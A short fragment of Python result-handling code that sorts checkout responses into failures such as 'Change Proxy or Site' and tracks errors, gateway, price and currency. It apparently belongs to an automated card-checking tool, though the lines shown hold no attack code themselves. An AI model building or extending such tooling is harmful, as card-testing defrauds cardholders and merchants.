                if "waitingreceipt" in fl:
                    stats["errors"] += 1
                    return False, "Change Proxy or Site", gateway, total_price, currency

            stats["errors"] += 1
            return False, "Unknown result", gateway, total_price, currency

    except Exception as e:
        stats["errors"] += 1
        return False, f"Error: {e}", gateway, total_price, currency
